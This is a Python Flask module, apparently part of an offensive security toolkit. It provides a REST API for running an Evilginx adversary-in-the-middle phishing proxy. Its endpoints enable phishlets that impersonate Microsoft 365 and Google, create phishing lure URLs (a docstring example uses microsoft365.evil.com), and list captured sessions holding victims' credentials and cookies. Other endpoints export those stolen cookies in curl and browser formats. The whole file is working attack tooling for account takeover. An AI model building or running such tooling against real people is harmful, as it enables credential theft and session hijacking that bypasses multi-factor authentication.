"""
Evilginx API - REST endpoints for AiTM attack management.

Provides endpoints for:
- Starting/stopping evilginx proxy
- Managing phishlets
- Creating lures (phishing URLs)
- Viewing captured sessions
- Exporting session cookies
"""

from __future__ import annotations

import logging

from flask import Blueprint, jsonify, request

logger = logging.getLogger(__name__)

evilginx_bp = Blueprint("evilginx", __name__, url_prefix="/api/evilginx")

# Module-level state (initialized from app context)
_evilginx_plugin = None


def _get_plugin():
    """Get the evilginx plugin module."""
    global _evilginx_plugin
    if _evilginx_plugin is None:
        try:
            from momo.apps.momo_plugins import evilginx_aitm
            _evilginx_plugin = evilginx_aitm
        except ImportError:
            logger.warning("Evilginx plugin not available")
    return _evilginx_plugin


@evilginx_bp.route("/status", methods=["GET"])
def get_status():
    """
    Get evilginx status.
    
    Returns:
        {
            "running": bool,
            "stats": {...},
            "phishlets_available": ["microsoft365", "google", ...]
        }
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    return jsonify({
        "running": plugin._manager.is_running if plugin._manager else False,
        "stats": plugin.get_stats(),
        "phishlets_available": plugin.list_phishlets(),
    })


@evilginx_bp.route("/start", methods=["POST"])
async def start_proxy():
    """
    Start evilginx proxy server.
    
    Returns:
        {"success": bool, "message": str}
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    success = await plugin.start_evilginx()
    
    if success:
        return jsonify({"success": True, "message": "Evilginx started"})
    else:
        return jsonify({"success": False, "message": "Failed to start evilginx"}), 500


@evilginx_bp.route("/stop", methods=["POST"])
async def stop_proxy():
    """
    Stop evilginx proxy server.
    
    Returns:
        {"success": bool, "message": str}
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    await plugin.stop_evilginx()
    return jsonify({"success": True, "message": "Evilginx stopped"})


@evilginx_bp.route("/phishlets", methods=["GET"])
def list_phishlets():
    """
    List available phishlets.
    
    Returns:
        {
            "phishlets": [
                {"name": "microsoft365", "description": "...", "enabled": false},
                ...
            ]
        }
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    phishlets = []
    for name in plugin.list_phishlets():
        info = plugin.get_phishlet_info(name)
        if info:
            phishlets.append(info)
    
    return jsonify({"phishlets": phishlets})


@evilginx_bp.route("/phishlets/<name>/enable", methods=["POST"])
async def enable_phishlet(name: str):
    """
    Enable a phishlet.
    
    Body (optional):
        {"hostname": "custom.domain.com"}
    
    Returns:
        {"success": bool, "message": str}
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    data = request.get_json() or {}
    hostname = data.get("hostname")
    
    success = await plugin.enable_phishlet(name, hostname)
    
    if success:
        return jsonify({"success": True, "message": f"Phishlet {name} enabled"})
    else:
        return jsonify({"success": False, "message": f"Failed to enable {name}"}), 400


@evilginx_bp.route("/phishlets/<name>/disable", methods=["POST"])
async def disable_phishlet(name: str):
    """
    Disable a phishlet.
    
    Returns:
        {"success": bool, "message": str}
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    if plugin._manager:
        success = await plugin._manager.disable_phishlet(name)
        if success:
            return jsonify({"success": True, "message": f"Phishlet {name} disabled"})
    
    return jsonify({"success": False, "message": f"Failed to disable {name}"}), 400


@evilginx_bp.route("/lures", methods=["GET"])
def list_lures():
    """
    List active lures.
    
    Returns:
        {"lures": [...]}
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    if plugin._manager:
        # Use sync wrapper for async method
        import asyncio
        try:
            loop = asyncio.new_event_loop()
            lures = loop.run_until_complete(plugin._manager.get_lures())
            loop.close()
        except Exception:
            lures = []
        
        return jsonify({
            "lures": [
                {
                    "id": lure.id,
                    "phishlet": lure.phishlet,
                    "url": lure.url,
                    "redirect_url": lure.redirect_url,
                    "created_at": lure.created_at.isoformat(),
                }
                for lure in lures
            ]
        })
    
    return jsonify({"lures": []})


@evilginx_bp.route("/lures", methods=["POST"])
async def create_lure():
    """
    Create a new phishing lure.
    
    Body:
        {
            "phishlet": "microsoft365",
            "redirect_url": "https://office.com" (optional)
        }
    
    Returns:
        {
            "success": bool,
            "lure": {
                "id": "abc123",
                "url": "https://microsoft365.evil.com/abc123",
                ...
            }
        }
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    data = request.get_json()
    if not data or "phishlet" not in data:
        return jsonify({"error": "phishlet is required"}), 400
    
    lure = await plugin.create_lure(
        data["phishlet"],
        redirect_url=data.get("redirect_url", "https://www.google.com"),
    )
    
    if lure:
        return jsonify({"success": True, "lure": lure})
    else:
        return jsonify({"success": False, "error": "Failed to create lure"}), 400


@evilginx_bp.route("/lures/<lure_id>", methods=["DELETE"])
async def delete_lure(lure_id: str):
    """
    Delete a lure.
    
    Returns:
        {"success": bool}
    """
    plugin = _get_plugin()
    if not plugin or not plugin._manager:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    success = await plugin._manager.delete_lure(lure_id)
    return jsonify({"success": success})


@evilginx_bp.route("/sessions", methods=["GET"])
def list_sessions():
    """
    List captured sessions.
    
    Query params:
        valid_only: bool - Only return non-expired sessions
    
    Returns:
        {"sessions": [...]}
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    valid_only = request.args.get("valid_only", "false").lower() == "true"
    
    # Use sync wrapper for async methods
    import asyncio
    try:
        loop = asyncio.new_event_loop()
        if valid_only:
            sessions = loop.run_until_complete(plugin.get_valid_sessions())
        else:
            sessions = loop.run_until_complete(plugin.get_sessions())
        loop.close()
    except Exception:
        sessions = []
    
    return jsonify({"sessions": sessions})


@evilginx_bp.route("/sessions/<session_id>", methods=["GET"])
def get_session(session_id: str):
    """
    Get a specific session.
    
    Returns:
        Session details including credentials and cookies
    """
    plugin = _get_plugin()
    if not plugin or not plugin._session_manager:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    session = plugin._session_manager.get_session(session_id)
    if session:
        return jsonify(session.to_dict())
    
    return jsonify({"error": "Session not found"}), 404


@evilginx_bp.route("/sessions/<session_id>/export", methods=["GET"])
def export_session(session_id: str):
    """
    Export session cookies.
    
    Query params:
        format: json|curl|netscape|raw (default: json)
    
    Returns:
        Exported cookie data in requested format
    """
    plugin = _get_plugin()
    if not plugin or not plugin._session_manager:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    format = request.args.get("format", "json")
    
    exported = plugin._session_manager.export_session_cookies(session_id, format)
    if exported:
        # Mark as exported
        plugin._session_manager.mark_exported(session_id)
        
        content_types = {
            "json": "application/json",
            "curl": "text/plain",
            "netscape": "text/plain",
            "raw": "text/plain",
        }
        
        return exported, 200, {"Content-Type": content_types.get(format, "text/plain")}
    
    return jsonify({"error": "Session not found or export failed"}), 404


@evilginx_bp.route("/sessions/<session_id>", methods=["DELETE"])
def delete_session(session_id: str):
    """
    Delete a session.
    
    Returns:
        {"success": bool}
    """
    plugin = _get_plugin()
    if not plugin or not plugin._session_manager:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    success = plugin._session_manager.delete_session(session_id)
    return jsonify({"success": success})


@evilginx_bp.route("/sessions/report", methods=["GET"])
def get_report():
    """
    Generate a text report of all captured sessions.
    
    Returns:
        Plain text report
    """
    plugin = _get_plugin()
    if not plugin or not plugin._session_manager:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    report = plugin._session_manager.generate_report()
    return report, 200, {"Content-Type": "text/plain"}


@evilginx_bp.route("/metrics", methods=["GET"])
def get_metrics():
    """
    Get Prometheus-compatible metrics.
    
    Returns:
        Prometheus text format metrics
    """
    plugin = _get_plugin()
    if not plugin:
        return jsonify({"error": "Evilginx plugin not loaded"}), 503
    
    metrics = plugin.get_metrics()
    
    # Format as Prometheus
    lines = []
    for key, value in metrics.items():
        lines.append(f"{key} {value}")
    
    return "\n".join(lines), 200, {"Content-Type": "text/plain"}

